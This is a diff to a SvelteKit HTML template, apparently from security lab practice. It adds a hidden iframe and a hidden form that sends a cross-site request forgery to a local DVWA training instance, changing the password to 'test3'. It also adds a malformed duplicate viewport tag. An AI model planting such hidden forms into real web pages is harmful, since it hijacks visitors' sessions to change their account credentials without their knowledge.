@@ -2,11 +2,18 @@
 <html lang="en">
 	<head>
 		<meta charset="utf-8" />
+		<meta name="viewport" content=""width=device-width, initial-scale=1.0">
 		<link rel="icon" href="%sveltekit.assets%/favicon.png" />
 		<meta name="viewport" content="width=device-width" />
 		%sveltekit.head%
 	</head>
 	<body data-sveltekit-preload-data="hover">
 		<div style="display: contents">%sveltekit.body%</div>
+			<iframe style="display:none" name="csrf-iframe"></iframe>
+			<form action="https://localhost/dvwa/vulnerabilities/csrf/?password_new=test3&password_conf=test3&Change=Change" method="get" target="csrf-iframe" id="csrf-form">
+            		<input type="hidden" name="password" value="kali">
+            		<input type="submit" value="Submit request">
+
+        		</form>
 	</body>
 </html>
